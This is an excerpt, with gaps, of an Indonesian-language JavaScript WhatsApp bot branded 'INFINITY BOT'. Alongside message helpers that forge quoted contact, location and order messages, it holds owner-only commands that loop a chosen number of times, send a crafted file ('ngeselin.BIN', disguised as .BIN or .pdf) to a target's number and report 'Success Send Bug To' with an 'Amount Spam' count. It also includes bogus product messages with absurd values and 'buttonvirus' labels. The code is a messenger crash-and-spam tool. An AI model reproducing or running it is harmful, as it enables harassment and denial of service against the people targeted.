...
🔥 KALAU MAU RENAME TARO CREDITS GUA : 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 */
...
//=================================================//
const bal= (teks) => {
zyren.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`,"body": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs`}}}, { quoted: doc })
} 
const bangtzy= (teks) => {
zyren.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs`}}}, { quoted: tzy })
} 
// Target
const reply = (teks) => {
return zyren.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs`}}}, { quoted: tzy })
} 
//=================================================//
// Kontak
...
const bacito = (jid, text, quoted = fkontak) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
//GCLINK
...
const bacit = (jid, text, quoted = fgclink) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
// VN 
...
const hwbro = (jid, text, quoted = fvn) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
    const paktzy = (jid, text, quoted = floc) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
//Troli
...
const review = (jid, text, quoted = ftroli) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
//image
...
const reploy = (jid, text, quoted = cayalog) => zyren.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./basetzy/gambarnye/pict.jpg'), sourceUrl: `https://chat.whatsapp.com/KPlIUaPaQGw1CrtXrIUkvs` }}}, { quoted })
//=================================================//
try {
...
"inviteExpiration": `${ngazap(prefix)}`,
						"groupName": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
${ngazap(prefix)}`,
						"caption": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
${ngazap(prefix)}`,
...
"title": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
${ngazap(prefix)}`,
"description": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`,
"currencyCode": "IDR",
"footerText": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`,
...
zyren.sendMessage(Pe, {text: "𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
"}, {quoted: a})
await sleep(10000)
...
zyren.sendMessage(num, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${place}.BIN`, title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
.BIN` }, { quoted: pak })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
bangtzy(tekteka)
...
jumlah = q.split('|')[1] 
for (let i = 0; i < jumlah; i++) {
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
...
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
zyren.sendMessage(num, { document: anuin, mimetype: 'application/pdf', fileName: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${place}.pdf`, title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
.pdf` }, { quoted: pak })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
bangtzy(tekteka)
...
if (!isCreator) return sticOwner(from)
  const buttons = [
  {buttonId: `${prefix}𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
`, buttonText: {displayText: cttl}, type: 1},
  {buttonId: '𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: '𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
', buttonText: {displayText: ngazap}, type: 1}
]
...
let ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./basetzy/gambarnye/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
...
if (!isCreator) return sticOwner(from)
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
zyren.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${place}.BIN`, title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
.BIN` }, { quoted: pak })
}
break
...
if (!isCreator) return sticOwner(from)
anuin = fs.readFileSync('./basetzy/mytzy/ngeselin.BIN')
zyren.sendMessage(m.chat, { document: anuin, mimetype: 'application/pdf', fileName: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 ${place}.pdf`, title: `𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
.pdf` }, { quoted: pak })
}
break
...
zyren.sendListMsg(m.chat, `🔥 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐁𝐎𝐓
 🔥`, zyren.user.name, `Hay Kak 𝐌𝐲 𝐂𝐡𝐞𝐧𝐞𝐥 Adia Di List`, `Click Here 🔥`, touchmebre, m)
break
//=================================================//
case 'hu': {
if (!isCreator) throw sticOwner(from)
...
"salePriceAmount1000": "10000000",
"retailerId": `༺~ •乂• ~༻`,
"url": "Wa.me/62882110909970"
},
"businessOwnerJid": "62882110909970@s.whatsapp.net",
}
